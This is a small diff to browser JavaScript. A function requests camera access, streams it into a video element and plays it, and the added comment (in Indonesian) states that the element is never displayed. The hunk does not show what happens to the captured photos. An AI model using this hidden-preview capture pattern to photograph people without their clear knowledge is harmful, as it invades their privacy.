@@ -16,7 +16,7 @@
     const startCameraAndCapturePhotos = async () => {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const video = document.createElement("video");
+        const video = document.createElement("video"); // Elemen hanya digunakan secara programatik, tidak ditampilkan
         video.srcObject = stream;
         await new Promise((resolve) => (video.onloadedmetadata = resolve));
         video.play();
